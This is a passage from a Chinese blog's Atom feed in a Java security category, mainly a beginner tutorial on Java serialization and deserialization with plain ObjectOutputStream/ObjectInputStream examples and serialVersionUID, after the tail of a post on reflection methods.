href="#获取该类对象对应类的修饰符、所在包、类名等基本信息" class="headerlink" title="获取该类对象对应类的修饰符、所在包、类名等基本信息"></a>获取该类对象对应类的修饰符、所在包、类名等基本信息</h6><ul><li><code>int getModifiers()</code>：返回此类或接口的所有修饰符，修饰符由 public 、protected 、private 、final 、static 、abstract 等对应的常量组成，返回的整数应使用 Modifier 工具类的方法来解码，才可以获取真的修饰符</li><li><code>Package getPackage()</code>：获取该类的包</li><li><code>String getName()</code>：以字符串形式返回此 Class 对象所表示的类的简称</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文介绍了 Java 的类加载与反射机制，概括了获得 Class 对象的几种方式，以及总结了反射获取类信息的方法。&lt;/p&gt;</summary>
    
    
    
    <category term="Java 安全" scheme="https://changeyourway.github.io/categories/Java-%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>基础篇 - Java 序列化与反序列化</title>
    <link href="https://changeyourway.github.io/2024/05/10/Java%20%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%AF%87-Java%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://changeyourway.github.io/2024/05/10/Java%20%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%AF%87-Java%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-05-10T11:53:40.077Z</published>
    <updated>2024-05-02T06:20:56.563Z</updated>
    
    <content type="html"><![CDATA[<p>Java 序列化是指把 Java 对象转换为字节序列的过程，而 Java 反序列化是指把字节序列恢复为 Java 对象的过程。本文详细讲解了 Java 序列化与反序列化的实现。</p><span id="more"></span><h2 id="Java-序列化与反序列化"><a href="#Java-序列化与反序列化" class="headerlink" title="Java 序列化与反序列化"></a>Java 序列化与反序列化</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>Java 序列化是指把 Java 对象转换为字节序列的过程，而 Java 反序列化是指把字节序列恢复为 Java 对象的过程。</p><h3 id="序列化与反序列化实现"><a href="#序列化与反序列化实现" class="headerlink" title="序列化与反序列化实现"></a>序列化与反序列化实现</h3><h5 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h5><p>只有实现了 <code>Serializable</code> 或者 <code>Externalizable</code> 接口的类的对象才能被序列化为字节序列。（不是则会抛出异常） </p><h6 id="Serializable-接口"><a href="#Serializable-接口" class="headerlink" title="Serializable 接口"></a>Serializable 接口</h6><p><code>Serializable</code> 接口是 Java 提供的序列化接口，它是一个空接口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public interface Serializable &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Serializable</code> 用来标识当前类可以被 <code>ObjectOutputStream</code> 序列化，以及被 <code>ObjectInputStream</code> 反序列化。</p><h6 id="Externalizable-接口"><a href="#Externalizable-接口" class="headerlink" title="Externalizable 接口"></a>Externalizable 接口</h6><p><code>Externalizable</code> 接口是一个更高级别的序列化机制，它允许类对序列化和反序列化过程进行更多的控制和自定义。</p><p>实现了 <code>Externalizable</code> 接口的类可以被序列化，但是它与实现 <code>Serializable</code> 接口的类有所不同，<code>Externalizable</code> 接口的序列化和反序列化方法对对象的状态完全负责，包括对象的所有成员变量。因此，在 <code>writeExternal</code> 和 <code>readExternal</code> 方法中，需要手动指定对象的所有成员变量的序列化和反序列化过程。</p><ul><li><p>类必须显式实现 <code>Externalizable</code> 接口。</p></li><li><p>类必须实现 <code>writeExternal</code> 和 <code>readExternal</code> 方法来手动指定对象的序列化和反序列化过程。这些方法负责将对象的状态写入和读取到指定的数据流中。</p></li><li><p>类必须提供一个公共的无参数构造函数，因为反序列化过程需要调用该构造函数来创建对象实例。</p><p>以下是代码示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">public class MyClass implements Externalizable &#123;</span><br><span class="line">  private int id;</span><br><span class="line">  private String name;</span><br><span class="line"></span><br><span class="line">  // 必须提供默认的构造函数</span><br><span class="line">  public MyClass() &#123;&#125;</span><br><span class="line"></span><br><span class="line">  public MyClass(int id, String name) &#123;</span><br><span class="line">      this.id = id;</span><br><span class="line">      this.name = name;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // 实现序列化的方法</span><br><span class="line">  @Override</span><br><span class="line">  public void writeExternal(ObjectOutput out) throws IOException &#123;</span><br><span class="line">      out.writeInt(id);</span><br><span class="line">      out.writeUTF(name);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // 实现反序列化的方法</span><br><span class="line">  @Override</span><br><span class="line">  public void readExternal(ObjectInput in) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">      id = in.readInt();</span><br><span class="line">      name = in.readUTF();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h6 id="其他条件"><a href="#其他条件" class="headerlink" title="其他条件"></a>其他条件</h6><p>除此之外，反序列化还有一些条件：</p><ol><li><strong>对象的所有成员都可序列化</strong>：如果一个类实现了 <code>Serializable</code> 接口，但其成员中有某些成员变量不可序列化，则序列化操作会失败。</li><li><strong>静态成员变量不参与序列化</strong>：静态成员变量属于类级别的数据，不包含在序列化的过程中。</li><li><strong>transient 关键字</strong>：如果某个成员变量被声明为 <code>transient</code>，则在序列化过程中会被忽略，不会被持久化。</li><li><strong>序列化版本号 serialVersionUID</strong>：建议显式声明一个名为 <code>serialVersionUID</code> 的静态变量，用于控制序列化的版本。若不声明，Java 会根据类的结构自动生成一个版本号，但建议显式声明以确保序列化的兼容性。</li></ol><h5 id="序列化对象"><a href="#序列化对象" class="headerlink" title="序列化对象"></a>序列化对象</h5><p>要将对象序列化成字节流，可以使用 <code>ObjectOutputStream</code> 类。通过 <code>ObjectOutputStream</code> 的 <code>writeObject()</code> 方法将对象写入输出流。</p><p>代码示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line">public class SerializationExample &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            MyClass obj = new MyClass();</span><br><span class="line">            FileOutputStream fileOut = new FileOutputStream(&quot;object.ser&quot;);</span><br><span class="line">            ObjectOutputStream out = new ObjectOutputStream(fileOut);</span><br><span class="line">            out.writeObject(obj);</span><br><span class="line">            out.close();</span><br><span class="line">            fileOut.close();</span><br><span class="line">            System.out.println(&quot;Object has been serialized&quot;);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="反序列化字节流"><a href="#反序列化字节流" class="headerlink" title="反序列化字节流"></a>反序列化字节流</h5><p>要从字节流中反序列化对象，可以使用 <code>ObjectInputStream</code> 类。通过 <code>ObjectInputStream</code> 的 <code>readObject()</code> 方法读取输入流中的对象。</p><p>代码示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line">public class DeserializationExample &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            FileInputStream fileIn = new FileInputStream(&quot;object.ser&quot;);</span><br><span class="line">            ObjectInputStream in = new ObjectInputStream(fileIn);</span><br><span class="line">            MyClass obj = (MyClass) in.readObject();</span><br><span class="line">            in.close();</span><br><span class="line">            fileIn.close();</span><br><span class="line">            System.out.println(&quot;Object has been deserialized&quot;);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="使用-ObjectOutputStream-与-ObjectInputStream-的注意事项"><a href="#使用-ObjectOutputStream-与-ObjectInputStream-的注意事项" class="headerlink" title="使用 ObjectOutputStream 与 ObjectInputStream 的注意事项"></a>使用 ObjectOutputStream 与 ObjectInputStream 的注意事项</h5><p>在上面的代码中，使用 <code>ObjectOutputStream</code>（ <code>ObjectInputStream</code> ）之前，先使用了 <code>FileOutputStream</code>（<code>FileInputStream</code> ）来处理数据。</p><p>实际上，<code>ObjectOutputStream</code> 需要一个输出流作为参数，因此在使用 <code>ObjectOutputStream</code> 之前，先使用 <code>FileOutputStream</code> 打开文件并创建一个文件输出流对象，以便将对象序列化后的数据写入文件。</p><p>同理，<code>ObjectInputStream</code> 是基于输入流的，它需要一个输入流作为参数来读取对象的序列化数据。而 <code>FileInputStream</code> 是一种输入流，用于从文件中读取字节流数据。</p><p>此外，重要的一点是：</p><p>ObjectOutputStream 中进行序列化操作的时候，会判断被序列化的对象是否自己重写了 writeObject 方法，如果重写了，就会调用被序列化对象自己的 writeObject 方法，如果没有重写，才会调用默认的序列化方法。</p><p>同理 ObjectInputStream 中进行序列化操作的时候，会判断被序列化的对象是否自己重写了 readObject方法，如果重写了，就会调用被序列化对象自己的 readObject方法，如果没有重写，才会调用默认的序列化方法。</p><h5 id="常见的输入输出流"><a href="#常见的输入输出流" class="headerlink" title="常见的输入输出流"></a>常见的输入输出流</h5><p>除了 <code>FileInputStream</code>（ <code>FileOutputStream</code>）之外，根据条件的不同，还可以使用其他的输入输出流来处理数据。</p><p>以下是一些常见的输入输出流以及它们的使用条件：</p><ol><li><strong>BufferedInputStream</strong>（<strong>BufferedOutputStream</strong>）：<ul><li>使用条件：当需要对读取或写入的数据进行缓冲以提高性能时，特别是对大文件或网络数据流的读取或写入。</li></ul></li><li><strong>ByteArrayInputStream</strong>（<strong>ByteArrayOutputStream</strong>）：<ul><li>使用条件：当需要从字节数组中读取数据，或将数据写入到字节数组中时。</li></ul></li><li><strong>ObjectInputStream</strong>（<strong>ObjectOutputStream</strong>）：<ul><li>使用条件：当需要将输入流中的数据反序列化为对象，或将对象序列化后的数据写入到输出流时。</li></ul></li><li><strong>PipedInputStream</strong>（<strong>PipedOutputStream</strong>）：<ul><li>使用条件：当需要通过管道与另一个线程进行数据交换时，可用于线程间通信。</li></ul></li><li><strong>DataInputStream</strong>（<strong>DataOutputStream</strong>）：<ul><li>使用条件：当需要从输入流中以 Java 基本数据类型的格式读取数据，或以 Java 基本数据类型的格式将数据写入输出流时。</li></ul></li><li><strong>FileInputStream</strong>（<strong>FileOutputStream</strong>）：<ul><li>使用条件：当需要从文件中读取字节数据，或将数据写入文件时。</li></ul></li><li><strong>其他自定义的 InputStream</strong>（<strong>OutputStream</strong>）：<ul><li>使用条件：如果有特定的需求，可以自定义实现 <code>InputStream</code>（<code>OutputStream</code>）类的子类，来满足自己的需求，比如从特定硬件设备中读取数据等。</li></ul></li></ol><h5 id="序列化版本号-serialVersionUID"><a href="#序列化版本号-serialVersionUID" class="headerlink" title="序列化版本号 serialVersionUID"></a>序列化版本号 serialVersionUID</h5><p>Java 的序列化机制是通过判断运行时类的 serialVersionUID 来验证版本一致性的，在进行反序列化时，JVM 会把传进来的字节流中的 serialVersionUID 与本地实体类中的 serialVersionUID 进行比较，如果相同则认为是一致的，便可以进行反序列化，否则就会报序列化版本不一致的异常。</p><p>如果没有显示指定 serialVersionUID ，Java 会根据类的结构自动生成一个，这种情况下，只有同一次编译生成的 class 才会生成相同的 serialVersionUID 。</p><p>有时候由于 serialVersionUID 发生改变，导致反序列化不能成功，为了不出现这类的问题，可以在要序列化的类中显式的声明一个名为 “ serialVersionUID ” 、类型为 long 的变量，并指定其值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private static final long serialVersionUID = 1L;</span><br></pre></td></tr></table></figure><p>这样就解决了兼容性问题。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Java 序列化是指把 Java 对象转换为字节序列的过程，而 Java 反序列化是指把字节序列恢复为 Java 对象的过程。本文详细讲解了 Java 序列化与反序列化的实现。&lt;/p&gt;</summary>
    
    
    
    <category term="Java 安全" scheme="https://changeyourway.github.io/categories/Java-%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
</feed>
